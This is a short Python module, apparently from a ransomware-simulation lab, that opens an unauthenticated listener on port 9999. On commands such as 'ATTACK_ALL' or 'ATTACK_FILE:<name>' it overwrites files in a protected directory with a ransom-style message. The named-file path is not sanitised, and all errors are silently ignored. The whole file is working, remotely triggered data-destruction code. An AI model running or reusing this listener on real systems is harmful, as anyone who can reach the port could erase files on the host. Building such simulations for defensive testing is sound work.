import os
import socket
import time
import config
import crypto_utils  # Imported to use the new log_event

def start_kali_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(1)
    
    while True:
        try:
            conn, addr = server.accept()
            crypto_utils.log_event(f"[NET] Incoming connection session established from Kali Host: {addr[0]}", "#007acc")
            
            data = conn.recv(1024).decode('utf-8').strip()
            
            if data in ["LAUNCH_RANSOMWARE_ATTACK", "ATTACK_ALL"]:
                crypto_utils.log_event("🚨 [KALI NETWORK] Critical Signal: Mass Ransomware Attack Command Received!", "#ff3333")
                for file_name in sorted(os.listdir(config.PROTECTED_DIR)):
                    target_file_path = os.path.join(config.PROTECTED_DIR, file_name)
                    if os.path.isfile(target_file_path):
                        try:
                            with open(target_file_path, "w", encoding="utf-8") as f:
                                f.write("🚨 TARGET LOCKED AND ENCRYPTED BY KALI MALWARE NETWORK. 🚨")
                            time.sleep(0.1) 
                        except Exception:
                            pass
            
            elif data.startswith("ATTACK_FILE:"):
                target_filename = data.split(":", 1)[1].strip()
                crypto_utils.log_event(f"🚨 [KALI NETWORK] Targeted Attack Signal received for element: {target_filename}", "#ffaa00")
                target_file_path = os.path.join(config.PROTECTED_DIR, target_filename)
                
                if os.path.isfile(target_file_path):
                    try:
                        with open(target_file_path, "w", encoding="utf-8") as f:
                            f.write("🚨 TARGET LOCKED AND ENCRYPTED BY KALI MALWARE NETWORK. 🚨")
                    except Exception:
                        pass
                        
            conn.close()
        except Exception:
            pass